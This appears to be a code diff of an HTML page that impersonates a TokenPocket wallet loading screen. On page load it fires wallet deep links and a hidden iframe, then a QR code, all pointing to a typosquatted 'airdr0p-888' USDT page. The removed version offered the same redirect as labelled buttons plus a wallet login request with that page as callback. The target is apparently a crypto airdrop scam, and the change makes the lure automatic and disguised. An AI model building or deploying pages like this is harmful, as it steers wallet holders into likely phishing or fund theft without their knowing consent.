@@ -3,83 +3,96 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>唤醒 TP 打开 BSC 页面</title>
+  <title>正在打开 TP 钱包...</title>
+  <style>
+    body {
+      margin: 0; padding: 0; background: #000; color: #fff;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      text-align: center; overflow: hidden;
+    }
+    .container {
+      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      width: 90%;
+    }
+    .logo { width: 80px; margin-bottom: 20px; }
+    .loading {
+      font-size: 18px; margin: 20px 0;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 0.6; }
+      50% { opacity: 1; }
+      100% { opacity: 0.6; }
+    }
+    .qrcode { margin-top: 30px; display: none; }
+    .qrcode img { width: 180px; border: 8px solid white; border-radius: 12px; }
+    .tip { font-size: 14px; color: #aaa; margin-top: 15px; }
+  </style>
 </head>
 <body>
 
-<h2>点击按钮唤醒 TP 钱包（BSC 链）并打开页面</h2>
-
-<!-- 主按钮：tpdapp 打开网页（BSC） -->
-<a href='tpdapp://open?params=%7B%22url%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%2C%22chain%22%3A%22BSC%22%2C%22source%22%3A%22web%22%7D' 
-   style="display: inline-block; padding:15px 30px; font-size:18px; background:#00A3FF; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
-  方案1: 直接在 TP BSC 浏览器打开页面
-</a>
-
-<br/>
-
-<!-- 备用按钮：tpoutside 授权 + BSC 回调 -->
-<a href='tpoutside://pull.activity?param=%7B%22action%22%3A%22login%22%2C%22actionId%22%3A%22unique-id-2025%22%2C%22blockchains%22%3A%5B%7B%22chainId%22%3A%2256%22%2C%22network%22%3A%22bsc%22%7D%5D%2C%22dappName%22%3A%22MyDApp%22%2C%22protocol%22%3A%22TokenPocket%22%2C%22version%22%3A%222.0%22%2C%22callbackUrl%22%3A%22https%3A%2F%2Fairdr0p-888.github.io%2Fusdt1688%2Findex.html%22%7D' 
-   style="display: inline-block; padding:15px 30px; font-size:18px; background:#28a745; color:white; border:none; border-radius:8px; text-decoration:none; margin:10px;">
-  方案2: BSC 授权后回调打开页面
-</a>
-
-<!-- JS 增强版按钮（自动 fallback） -->
-<button onclick="openTPWithFallback()" style="padding:15px 30px; font-size:18px; background:#6f42c1; color:white; border:none; border-radius:8px; cursor:pointer; margin:10px;">
-  方案3: 智能唤醒 TP（BSC）+ 打开页面
-</button>
-
-<div id="qrcode" style="margin-top:20px; display:none; text-align:center;">
-  <p>如果失败，用 TP 钱包扫码打开：</p>
-  <img id="qrcode-img" src="" alt="二维码" style="width:200px; border:1px solid #ccc;">
+<div class="container">
+  <img src="https://tokenpocket.pro/static/logo.png" alt="TP" class="logo">
+  <div class="loading">正在唤醒 TokenPocket 钱包（BSC）...</div>
+  <div id="qrcode" class="qrcode">
+    <p style="margin:10px 0; font-size:16px;">请用 TP 钱包扫码打开</p>
+    <img id="qr-img" src="" alt="二维码">
+  </div>
+  <p class="tip">如果未自动跳转，请长按保存二维码</p>
 </div>
 
 <script>
 const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
 
+// 检测是否在 TP 浏览器
 function isTPBrowser() {
   const ua = navigator.userAgent.toLowerCase();
   return ua.indexOf('tokenpocket') !== -1 || ua.indexOf('tpdapp') !== -1;
 }
 
-function showQRCode(url) {
+// 显示二维码
+function showQR() {
   const qr = document.getElementById('qrcode');
-  const img = document.getElementById('qrcode-img');
-  if (!qr || !img) return;
-  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+  const img = document.getElementById('qr-img');
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
   qr.style.display = 'block';
 }
 
-function openTPWithFallback() {
+// 主函数：自动唤醒 TP（BSC）
+function autoOpenTP() {
   if (isTPBrowser()) {
     location.href = TARGET_URL;
     return;
   }
 
-  // 方案1: tpdapp 打开网页（BSC）
-  const params1 = { url: TARGET_URL, chain: "BSC", source: "web" };
-  const encodedParams1 = encodeURIComponent(JSON.stringify(params1));
-  const scheme1 = `tpdapp://open?params=${encodedParams1}`;
-  window.location.href = scheme1;
+  const params = {
+    url: TARGET_URL,
+    chain: "BSC",
+    source: "web"
+  };
+  const encoded = encodeURIComponent(JSON.stringify(params));
+  const scheme = `tpdapp://open?params=${encoded}`;
 
-  // 方案2: 300ms 后 tpoutside 授权 + BSC 回调
+  // 立即尝试唤醒
+  window.location.href = scheme;
+
+  // iOS 增强唤醒
   setTimeout(() => {
-    const params2 = {
-      action: "login",
-      actionId: Date.now().toString(),
-      blockchains: [{ chainId: "56", network: "bsc" }],
-      dappName: "MyDApp",
-      protocol: "TokenPocket",
-      version: "2.0",
-      callbackUrl: TARGET_URL
-    };
-    const encodedParams2 = encodeURIComponent(JSON.stringify(params2));
-    const scheme2 = `tpoutside://pull.activity?param=${encodedParams2}`;
-    window.location.href = scheme2;
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = scheme;
+      document.body.appendChild(iframe);
+      setTimeout(() => document.body.removeChild(iframe), 2000);
+    } catch (e) {}
   }, 300);
 
-  // 兜底: 3.5s 后显示二维码
-  setTimeout(() => showQRCode(TARGET_URL), 3500);
+  // 3.5 秒后显示二维码（兜底）
+  setTimeout(showQR, 3500);
 }
+
+// 页面加载后立即执行
+window.onload = autoOpenTP;
 </script>
 
 </body>
